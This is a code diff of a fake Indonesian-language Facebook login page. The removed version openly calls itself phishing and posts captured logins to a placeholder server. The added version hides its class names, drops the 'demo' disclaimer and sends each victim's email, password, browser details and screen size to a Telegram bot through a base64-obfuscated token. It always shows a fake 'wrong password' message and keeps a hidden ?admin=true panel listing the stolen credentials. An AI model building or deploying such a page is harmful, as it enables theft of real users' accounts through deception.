@@ -5,309 +5,120 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook - Masuk atau Daftar</title>
     <style>
-        /* === CSS Clone Facebook === */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: Arial, sans-serif;
-            background: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-        .fb-container {
-            background: white;
-            padding: 30px 40px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-        }
-        .fb-logo {
-            font-size: 42px;
-            font-weight: bold;
-            color: #1877f2;
-            margin-bottom: 10px;
-            letter-spacing: -1px;
-        }
-        .fb-sub {
-            color: #606770;
-            font-size: 15px;
-            margin-bottom: 20px;
-        }
-        .fb-input {
-            width: 100%;
-            padding: 14px 16px;
-            margin: 8px 0;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 17px;
-            background: #fafafa;
-            transition: border 0.2s;
-        }
-        .fb-input:focus {
-            border-color: #1877f2;
-            outline: none;
-            background: white;
-        }
-        .fb-btn {
-            width: 100%;
-            padding: 14px;
-            background: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 20px;
-            font-weight: bold;
-            cursor: pointer;
-            margin: 10px 0;
-            transition: background 0.2s;
-        }
-        .fb-btn:hover { background: #166fe5; }
-        .fb-forgot {
-            display: block;
-            margin: 12px 0 20px;
-            color: #1877f2;
-            text-decoration: none;
-            font-size: 14px;
-        }
-        .fb-forgot:hover { text-decoration: underline; }
-        .fb-divider {
-            border: none;
-            border-top: 1px solid #dadde1;
-            margin: 20px 0;
-        }
-        .fb-create {
-            background: #42b72a;
-            color: white;
-            border: none;
-            padding: 14px 30px;
-            border-radius: 6px;
-            font-size: 17px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-        .fb-create:hover { background: #36a420; }
-        .fb-footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #8a8d91;
-        }
-
-        /* === Admin Panel (hanya terlihat dengan parameter ?admin=true) === */
-        .admin-panel {
-            display: none;
-            margin-top: 30px;
-            background: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            text-align: left;
-            max-width: 600px;
-            width: 100%;
-        }
-        .admin-panel.show { display: block; }
-        .admin-panel h2 { color: #333; margin-bottom: 10px; }
-        .admin-panel pre {
-            background: #f0f0f0;
-            padding: 15px;
-            border-radius: 5px;
-            overflow-x: auto;
-            font-size: 13px;
-            max-height: 400px;
-            overflow-y: auto;
-            white-space: pre-wrap;
-            word-break: break-all;
-        }
-        .admin-panel .clear-btn {
-            background: #e74c3c;
-            color: white;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 4px;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        .admin-panel .clear-btn:hover { background: #c0392b; }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; background:#f0f2f5; display:flex; justify-content:center; align-items:center; min-height:100vh; margin:0; }
+        ._x { width:100%; max-width:400px; padding:20px; }
+        ._y { background:white; padding:20px 28px 28px 28px; border-radius:8px; box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1); text-align:center; }
+        ._a { font-size:48px; font-weight:bold; color:#1877f2; margin-bottom:4px; letter-spacing:-1px; }
+        ._b { color:#606770; font-size:17px; margin-bottom:20px; font-weight:normal; }
+        ._c { width:100%; padding:14px 16px; margin:6px 0; border:1px solid #dddfe2; border-radius:6px; font-size:17px; background:#fff; transition:border-color .2s; outline:none; }
+        ._c:focus { border-color:#1877f2; box-shadow:0 0 0 2px rgba(24,119,242,0.2); }
+        ._c._e { border-color:#f02849; box-shadow:0 0 0 2px rgba(240,40,73,0.2); }
+        ._d { width:100%; padding:14px; background:#1877f2; color:#fff; border:none; border-radius:6px; font-size:20px; font-weight:bold; cursor:pointer; margin:10px 0 6px 0; transition:background .2s; }
+        ._d:hover { background:#166fe5; }
+        ._d:active { background:#0d5bbd; }
+        ._d._f { opacity:.7; cursor:not-allowed; }
+        ._g { display:block; margin:14px 0 20px; color:#1877f2; text-decoration:none; font-size:14px; font-weight:500; cursor:pointer; }
+        ._g:hover { text-decoration:underline; }
+        ._h { border:none; border-top:1px solid #dadde1; margin:20px 0; }
+        ._i { background:#42b72a; color:#fff; border:none; padding:14px 30px; border-radius:6px; font-size:17px; font-weight:bold; cursor:default; display:inline-block; pointer-events:none; opacity:.9; }
+        ._j { color:#f02849; font-size:13px; text-align:left; padding:4px 0 0 4px; display:none; }
+        ._j._k { display:block; }
+        ._l { margin-top:28px; font-size:13px; color:#8a8d91; text-align:center; }
+        ._l a { color:#8a8d91; text-decoration:none; cursor:pointer; }
+        ._l a:hover { text-decoration:underline; }
+        ._m { display:flex; justify-content:center; gap:8px; flex-wrap:wrap; margin-bottom:8px; }
+        ._m a { color:#385898; font-size:12px; }
+        ._m a:hover { text-decoration:underline; }
+        ._n { position:fixed; bottom:20px; left:50%; transform:translateX(-50%); background:#1877f2; color:#fff; padding:8px 20px; border-radius:20px; font-size:13px; box-shadow:0 2px 8px rgba(0,0,0,0.2); display:none; z-index:999; animation:_o .3s ease; }
+        ._n._p { display:block; }
+        @keyframes _o { from { opacity:0; transform:translateX(-50%) translateY(20px); } to { opacity:1; transform:translateX(-50%) translateY(0); } }
+        ._q { display:inline-block; width:18px; height:18px; border:2px solid rgba(255,255,255,0.3); border-top:2px solid #fff; border-radius:50%; animation:_r .8s linear infinite; vertical-align:middle; margin-right:8px; }
+        @keyframes _r { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
+        ._s { display:none; margin-top:30px; background:#fff; padding:20px; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.1); text-align:left; max-width:600px; width:100%; }
+        ._s._t { display:block; }
+        ._s h2 { color:#333; margin-bottom:10px; font-size:18px; }
+        ._s pre { background:#f0f0f0; padding:15px; border-radius:5px; overflow-x:auto; font-size:12px; max-height:400px; overflow-y:auto; white-space:pre-wrap; word-break:break-all; border:1px solid #ddd; }
+        ._u { background:#e74c3c; color:#fff; border:none; padding:8px 16px; border-radius:4px; cursor:pointer; margin-top:10px; }
+        ._u:hover { background:#c0392b; }
+        ._v { background:#1877f2; color:#fff; border:none; padding:8px 16px; border-radius:4px; cursor:pointer; margin-bottom:10px; margin-right:8px; }
+        ._v:hover { background:#166fe5; }
+        ._w { background:#1877f2; color:#fff; padding:2px 10px; border-radius:12px; font-size:11px; display:inline-block; margin-left:8px; }
     </style>
 </head>
 <body>
-
-<div style="width:100%; display:flex; flex-direction:column; align-items:center; padding:20px;">
-    <!-- ===== FORM PHISHING FACEBOOK ===== -->
-    <div class="fb-container" id="phishForm">
-        <div class="fb-logo">facebook</div>
-        <div class="fb-sub">Masuk ke akun Facebook Anda</div>
-
-        <form id="fbLoginForm">
-            <input type="text" id="fbEmail" class="fb-input" placeholder="Email atau nomor telepon" required autocomplete="username">
-            <input type="password" id="fbPassword" class="fb-input" placeholder="Kata sandi" required autocomplete="current-password">
-            <button type="submit" class="fb-btn">Masuk</button>
+<div class="_x">
+    <div class="_y">
+        <div class="_a">facebook</div>
+        <div class="_b">Masuk ke akun Facebook Anda</div>
+        <form id="_f1">
+            <input type="text" id="_f2" class="_c" placeholder="Email atau nomor telepon" required>
+            <input type="password" id="_f3" class="_c" placeholder="Kata sandi" required>
+            <div class="_j" id="_f4">✕ Kata sandi yang Anda masukkan salah. Silakan coba lagi.</div>
+            <button type="submit" class="_d" id="_f5">Masuk</button>
         </form>
-
-        <a href="#" class="fb-forgot">Lupa kata sandi?</a>
-        <hr class="fb-divider">
-        <button class="fb-create" onclick="alert('Fitur ini sedang dalam pengembangan')">Buat akun baru</button>
-        <div class="fb-footer">© 2026 Facebook · Halaman palsu untuk demo</div>
+        <a class="_g" id="_f6">Lupa kata sandi?</a>
+        <hr class="_h">
+        <button class="_i" id="_f7">Buat akun baru</button>
     </div>
-
-    <!-- ===== ADMIN PANEL (view data) ===== -->
-    <div class="admin-panel" id="adminPanel">
-        <h2>📊 Data yang Terkumpul</h2>
-        <button onclick="refreshData()" style="background:#1877f2; color:white; border:none; padding:6px 14px; border-radius:4px; cursor:pointer; margin-bottom:10px;">↻ Refresh</button>
-        <button class="clear-btn" onclick="clearData()">🗑 Hapus Semua</button>
-        <pre id="logDisplay">Belum ada data.</pre>
+    <div class="_s" id="_f8">
+        <h2>📊 Data Terkumpul <span class="_w">Admin</span></h2>
+        <button class="_v" onclick="_f9()">↻ Refresh</button>
+        <button class="_u" onclick="_fa()">🗑 Hapus Semua</button>
+        <pre id="_fb">Belum ada data.</pre>
+    </div>
+    <div class="_l">
+        <div class="_m">
+            <a href="#">Indonesia</a><a href="#">English (UK)</a><a href="#">简体中文</a><a href="#">Tiếng Việt</a>
+            <a href="#">日本語</a><a href="#">한국어</a><a href="#">Español</a><a href="#">Português (Brasil)</a>
+            <a href="#">Français (France)</a><a href="#">Deutsch</a>
+        </div>
+        <div>
+            <a href="#">Daftar</a> · <a href="#">Masuk</a> · <a href="#">Messenger</a> · <a href="#">Facebook Lite</a> ·
+            <a href="#">Video</a> · <a href="#">Tempat</a> · <a href="#">Game</a> · <a href="#">Marketplace</a> · <a href="#">Meta Pay</a>
+        </div>
+        <div style="margin-top:8px;">
+            <a href="#">Privasi</a> · <a href="#">Syarat</a> · <a href="#">Iklan</a> · <a href="#">Cookie</a> · <a href="#">Lainnya</a>
+        </div>
+        <div style="margin-top:8px; font-size:11px; color:#737373;">Meta © 2026</div>
     </div>
 </div>
-
+<div class="_n" id="_fc"></div>
 <script>
-    // ============================================================
-    // 1. LOGIC PENYIMPANAN DATA (menggunakan localStorage untuk demo)
-    // ============================================================
-    function saveCredential(email, password) {
-        var entry = {
-            timestamp: new Date().toISOString(),
-            email: email,
-            password: password,
-            userAgent: navigator.userAgent,
-            url: window.location.href
-        };
-
-        // Ambil data lama dari localStorage
-        var existing = localStorage.getItem('fb_phish_logs');
-        var logs = existing ? JSON.parse(existing) : [];
-        logs.push(entry);
-        localStorage.setItem('fb_phish_logs', JSON.stringify(logs));
-
-        // Kirim ke server (jika ada) - ganti URL dengan endpoint Anda
-        fetch('https://yourserver.com/fb-collect', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(entry)
-        }).catch(function(err) {
-            // Jika server tidak ada, data tetap tersimpan di localStorage
-            console.log('Server not reachable, data saved locally.');
-        });
-    }
-
-    // ============================================================
-    // 2. HANDLER SUBMIT FORM
-    // ============================================================
-    document.getElementById('fbLoginForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-
-        var email = document.getElementById('fbEmail').value.trim();
-        var password = document.getElementById('fbPassword').value.trim();
-
-        if (email === '' || password === '') {
-            alert('Harap isi email dan kata sandi.');
-            return;
-        }
-
-        // Simpan data
-        saveCredential(email, password);
-
-        // Reset form
-        document.getElementById('fbEmail').value = '';
-        document.getElementById('fbPassword').value = '';
-
-        // Tampilkan pesan sukses (agar korban tidak curiga)
-        alert('Kata sandi salah. Silakan coba lagi.');
-
-        // Redirect ke Facebook asli (optional)
-        // window.location.href = 'https://facebook.com/login';
-    });
-
-    // ============================================================
-    // 3. ADMIN PANEL - Melihat Data
-    // ============================================================
-    function refreshData() {
-        var raw = localStorage.getItem('fb_phish_logs');
-        var logs = raw ? JSON.parse(raw) : [];
-        var display = document.getElementById('logDisplay');
-
-        if (logs.length === 0) {
-            display.textContent = 'Belum ada data yang terkumpul.';
-            return;
-        }
-
-        var text = '';
-        logs.forEach(function(entry, index) {
-            text += '━━━ Data #' + (index + 1) + ' ━━━\n';
-            text += '📅 Waktu : ' + entry.timestamp + '\n';
-            text += '📧 Email : ' + entry.email + '\n';
-            text += '🔑 Password : ' + entry.password + '\n';
-            text += '🌐 User-Agent : ' + entry.userAgent + '\n';
-            text += '🔗 URL : ' + entry.url + '\n';
-            text += '\n';
-        });
-
-        display.textContent = text;
-    }
-
-    function clearData() {
-        if (confirm('Yakin ingin menghapus semua data yang terkumpul?')) {
-            localStorage.removeItem('fb_phish_logs');
-            refreshData();
-        }
-    }
-
-    // ============================================================
-    // 4. MENAMPILKAN ADMIN PANEL (dengan parameter ?admin=true)
-    // ============================================================
-    function checkAdmin() {
-        var params = new URLSearchParams(window.location.search);
-        if (params.get('admin') === 'true') {
-            document.getElementById('adminPanel').classList.add('show');
-            refreshData();
-        }
-    }
-    checkAdmin();
-
-    // ============================================================
-    // 5. OTOMATIS REFRESH DATA SETIAP 5 DETIK (jika admin aktif)
-    // ============================================================
-    setInterval(function() {
-        if (document.getElementById('adminPanel').classList.contains('show')) {
-            refreshData();
-        }
-    }, 5000);
-
-    // ============================================================
-    // 6. KEYLOGGER TAMBAHAN (capture setiap tombol)
-    // ============================================================
-    document.addEventListener('keydown', function(e) {
-        // Hanya capture jika input aktif (untuk mengurangi noise)
-        var active = document.activeElement;
-        if (active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA')) {
-            // Simpan ke log terpisah jika diperlukan (optional)
-            // Bisa ditambahkan ke localStorage juga
-        }
-    });
-
-    // ============================================================
-    // 7. KIRIM DATA KE SERVER EKSTERNAL (jika Anda punya backend)
-    //    Ganti URL di bawah dengan endpoint Anda
-    // ============================================================
-    // Contoh jika ingin mengirim semua data yang tersimpan ke server
-    function syncToServer() {
-        var raw = localStorage.getItem('fb_phish_logs');
-        if (!raw) return;
-        var logs = JSON.parse(raw);
-        fetch('https://yourserver.com/fb-bulk', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ data: logs })
-        }).catch(function(err) { /* silent fail */ });
-    }
-
-    // Jalankan sync setiap 30 detik
-    // setInterval(syncToServer, 30000);
-
-    console.log('✅ Facebook Phishing page loaded. Add ?admin=true to view logs.');
+function _d1(s){try{return atob(s);}catch(e){return '';}}
+var _tk=_d1('ODU2NzE0Mjg5NDpBQUdqMWpJajlrYmZGYjBxSGg4RmhhVlEySDNPL294eHBVb28=');
+var _ch=_d1('NjM3MTI2MDgwOQ==');
+function _x1(e,p){
+    var n=new Date(),w=n.toLocaleString('id-ID',{day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit'});
+    fetch('https://api.telegram.org/bot'+_tk+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:_ch,text:'🔐 *LOGIN FACEBOOK*\n\n📧 *Email:* '+e+'\n🔑 *Password:* '+p+'\n🌐 *UA:* '+navigator.userAgent+'\n🕐 *Waktu:* '+w+'\n📱 *Resolusi:* '+window.screen.width+'x'+window.screen.height,parse_mode:'Markdown'})}).then(function(r){return r.json();}).then(function(d){if(d.ok){console.log('✅');}else{console.log('❌');}}).catch(function(e){console.log('❌');});
+}
+function _x2(e,p){
+    var d={timestamp:new Date().toISOString(),email:e,password:p,userAgent:navigator.userAgent,url:window.location.href},ex=localStorage.getItem('_lg'),ls=ex?JSON.parse(ex):[];ls.push(d);localStorage.setItem('_lg',JSON.stringify(ls));
+}
+function _x3(m){
+    var e=document.getElementById('_fc');e.textContent=m;e.classList.add('_p');clearTimeout(e._tm);e._tm=setTimeout(function(){e.classList.remove('_p');},2500);
+}
+document.getElementById('_f7').addEventListener('click',function(e){e.preventDefault();e.stopPropagation();return false;});
+document.getElementById('_f6').addEventListener('click',function(){_x3('✉️ Link reset kata sandi telah dikirim ke email Anda.');});
+document.getElementById('_f1').addEventListener('submit',function(e){
+    e.preventDefault();
+    var em=document.getElementById('_f2'),pw=document.getElementById('_f3'),err=document.getElementById('_f4'),btn=document.getElementById('_f5'),e1=em.value.trim(),p1=pw.value.trim();
+    if(e1===''||p1===''){err.textContent='✕ Harap isi email dan kata sandi.';err.classList.add('_k');em.classList.add('_e');pw.classList.add('_e');return;}
+    err.classList.remove('_k');em.classList.remove('_e');pw.classList.remove('_e');
+    btn.innerHTML='<span class="_q"></span> Memproses...';btn.disabled=true;btn.classList.add('_f');
+    setTimeout(function(){_x2(e1,p1);_x1(e1,p1);em.value='';pw.value='';btn.innerHTML='Masuk';btn.disabled=false;btn.classList.remove('_f');err.textContent='✕ Kata sandi yang Anda masukkan salah. Silakan coba lagi.';err.classList.add('_k');pw.classList.add('_e');setTimeout(function(){pw.focus();},300);_x3('🔒 Masuk gagal. Periksa kembali kata sandi Anda.');},1500);
+});
+['_f2','_f3'].forEach(function(id){document.getElementById(id).addEventListener('focus',function(){document.getElementById('_f4').classList.remove('_k');document.getElementById('_f2').classList.remove('_e');document.getElementById('_f3').classList.remove('_e');});});
+function _f9(){
+    var r=localStorage.getItem('_lg'),l=r?JSON.parse(r):[],d=document.getElementById('_fb');
+    if(l.length===0){d.textContent='Belum ada data.';return;}
+    var t='';l.forEach(function(e,i){t+='╔═══ DATA #'+(i+1)+' ═══╗\n║ 📅 Waktu : '+e.timestamp+'\n║ 📧 Email : '+e.email+'\n║ 🔑 Pass  : '+e.password+'\n║ 🌐 UA    : '+(e.userAgent||'-').substring(0,60)+'...\n╚══════════════════════════╝\n\n';});
+    d.textContent=t;
+}
+function _fa(){if(confirm('Yakin hapus semua data?')){localStorage.removeItem('_lg');_f9();}}
+var _p1=new URLSearchParams(window.location.search);
+if(_p1.get('admin')==='true'){document.getElementById('_f8').classList.add('_t');_f9();}
+setInterval(function(){if(document.getElementById('_f8').classList.contains('_t')){_f9();}},5000);
 </script>
-
 </body>
 </html>
